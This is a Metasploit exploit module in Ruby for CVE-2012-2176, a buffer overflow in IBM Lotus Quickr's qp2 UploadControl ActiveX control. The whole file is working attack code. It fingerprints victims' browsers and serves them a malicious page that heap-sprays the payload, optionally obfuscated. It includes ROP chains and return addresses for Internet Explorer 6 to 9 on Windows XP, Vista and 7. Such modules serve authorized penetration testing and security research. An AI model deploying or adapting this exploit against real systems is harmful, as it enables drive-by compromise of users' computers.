# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "9.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => Rank,
    :classid    => "{05D96F71-87C6-11D3-9BE4-00902742D6E0}",
    :method     => "Attachment_Times"
  })


  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "IBM Lotus QuickR qp2 ActiveX Buffer Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow vulnerability on the UploadControl
        ActiveX. The vulnerability exists in the handling of the "Attachment_Times"
        property, due to the insecure usage of the _swscanf. The affected ActiveX is
        provided by the qp2.dll installed with the IBM Lotus Quickr product.

        This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,
        using the qp2.dll 8.1.0.1800. In order to bypass ASLR the no aslr compatible module
        msvcr71.dll is used. This one is installed with the qp2 ActiveX.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Gaurav Baruah&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-2176&#039; ],
          [ &#039;OSVDB&#039;, &#039;82166&#039; ],
          [ &#039;BID&#039;, &#039;53678&#039;],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-134/&#039; ],
          [ &#039;URL&#039;, &#039;http://www-01.ibm.com/support/docview.wss?uid=swg21596191&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 978,
          &#039;DisableNops&#039; => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # qp2.dll 8.1.0.1800
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 6 on Windows XP SP3&#039;, { &#039;Rop&#039; => nil,  &#039;Offset&#039; => &#039;0x5F4&#039;, &#039;Ret&#039; => 0x0c0c0c0c } ],
          [ &#039;IE 7 on Windows XP SP3&#039;, { &#039;Rop&#039; => nil,  &#039;Offset&#039; => &#039;0x5F4&#039;, &#039;Ret&#039; => 0x0c0c0c0c } ],
          [ &#039;IE 8 on Windows XP SP3&#039;, { &#039;Rop&#039; => :jre, &#039;Offset&#039; => &#039;0x5f4&#039;, &#039;Ret&#039; => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll
          [ &#039;IE 7 on Windows Vista&#039;,  { &#039;Rop&#039; => nil,  &#039;Offset&#039; => &#039;0x5f4&#039;, &#039;Ret&#039; => 0x0c0c0c0c } ],
          [ &#039;IE 8 on Windows Vista&#039;,  { &#039;Rop&#039; => :jre, &#039;Offset&#039; => &#039;0x5f4&#039;, &#039;Ret&#039; => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll
          [ &#039;IE 8 on Windows 7&#039;,      { &#039;Rop&#039; => :jre, &#039;Offset&#039; => &#039;0x5f4&#039;, &#039;Ret&#039; => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll
          [ &#039;IE 9 on Windows 7&#039;,      { &#039;Rop&#039; => :jre, &#039;Offset&#039; => &#039;0x5fe&#039;, &#039;Ret&#039; => 0x7C346B52 } ]  # pop esp # ret # msvcr71.dll
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "May 23 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    when &#039;6.0&#039;
      os_name = &#039;Windows Vista&#039;
    when &#039;6.1&#039;
      os_name = &#039;Windows 7&#039;
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

    # Land the payload at 0x0c0c0c0c
    case my_target
    when targets[7]
      # IE 9 on Windows 7
      js = %Q|
      function randomblock(blocksize)
      {
        var theblock = "";
        for (var i = 0; i < blocksize; i++)
        {
          theblock += Math.floor(Math.random()*90)+10;
        }
        return theblock;
      }

      function tounescape(block)
      {
        var blocklen = block.length;
        var unescapestr = "";
        for (var i = 0; i < blocklen-1; i=i+4)
        {
          unescapestr += "%u" + block.substring(i,i+4);
        }
        return unescapestr;
      }

      var heap_obj = new heapLib.ie(0x10000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_random_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset_length = #{my_target[&#039;Offset&#039;]};
      for (var i=0; i < 0x1000; i++) {
        var padding = unescape(tounescape(randomblock(0x1000)));
        while (padding.length < 0x1000) padding+= padding;
        var junk_offset = padding.substring(0, offset_length);
        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
        heap_obj.alloc(sprayblock);
      }
      |

    else
      # For IE 6, 7, 8
      js = %Q|
      var heap_obj = new heapLib.ie(0x20000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
      var overflow = nops.substring(0, 10);
      |

    end

    js = heaplib(js, {:noobfu => true})

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t[&#039;Rop&#039;].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    case t[&#039;Rop&#039;]
    when :jre
      print_status("Using JRE ROP")
      rop_payload = generate_rop_payload(&#039;java&#039;, code)#, {&#039;pivot&#039;=>stack_pivot})
    end

    return rop_payload
  end

  def load_exploit_html(my_target, cli)
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)

    bof = rand_text_alpha(512) # offset to eip"
    bof << [my_target.ret].pack("V")
    if my_target[&#039;Rop&#039;]
      bof << rand_text_alpha(4)
      bof << [0x0c0c0c0c].pack("V") # new stack
    end

    my_bof = Rex::Text.to_unescape(bof)

    html = %Q|
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object id="UploadControl" width="100%" height="100%" classid="clsid:05D96F71-87C6-11D3-9BE4-00902742D6E0">
      <param name="General_Mode" value="1">
      <param name="General_URL" value="http://#{rand_text_alpha(rand(10) + 5)}">
    </object>
    <script>
      var bof = unescape("#{my_bof}");
      var my_time = "#{rand_text_numeric(2)}/#{rand_text_numeric(2)}/#{rand_text_numeric(4)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)} ";
      my_time += bof;
      my_time += " GMT";
      UploadControl.Attachment_Times = my_time;
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, &#039;&#039;)
    print_status("Sending HTML...")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end

end

